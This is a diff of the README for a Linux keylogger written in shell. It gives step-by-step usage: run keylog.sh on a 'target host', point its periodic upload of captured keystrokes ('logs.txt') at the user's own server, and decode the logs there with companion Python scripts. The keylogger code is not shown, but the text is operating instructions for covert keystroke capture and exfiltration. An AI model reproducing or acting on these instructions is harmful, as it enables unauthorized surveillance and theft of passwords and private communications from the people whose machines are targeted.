@@ -6,11 +6,10 @@ A streamlined keylogger for Linux systems written in shell.
 - Edit "keylog.sh" in notepad.
 - replace the upload interval with your desired amount in seconds. 
 - Replace "http://yourserver.com/upload" with your own upload server url.
-- Open terminal, cd to directory of keylog.sh and make the script executable:
+- Open terminal of target host, cd to directory of keylog.sh and execute using:
 ```
-sudo chmod +x keylog.sh
+./keylog.sh
 ```
-- Run "keylog.sh" on target host.
 - "logs.txt" will upload to your server and update every X number of seconds according to your specification.
 - Move "decoder.py" and "sentencer.py" to the same directory of server as "logs.txt" or create a new folder and add all files to it.
 - cd to directory where the files are contained and you can either run:
